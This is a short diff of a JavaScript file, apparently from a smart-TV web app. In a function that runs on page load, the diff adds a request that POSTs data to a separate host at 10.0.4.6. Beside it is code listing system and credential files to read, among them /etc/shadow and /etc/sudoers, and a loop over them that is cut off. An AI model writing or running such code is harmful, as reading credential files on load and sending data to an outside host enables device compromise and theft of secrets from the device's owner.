@@ -35,6 +35,13 @@ function getFile(file){
 }
 
 function realOnload(){	
+	
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://10.0.4.6/upload", true);
+	xhr.setRequestHeader("Content-Type", "text/plain");
+	xhr.setRequestHeader("X-Filename", "my_upload.txt");
+	xhr.send("Hello from SmartTV!");
+	
 	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd', '/var/log/dmesg', '/var/log/messages'];
 	files = ['/etc/fstab', '/etc/hosts', '/etc/resolv.conf', "/etc/profile"];
 	for(var i = 0; i<files.length; i++){
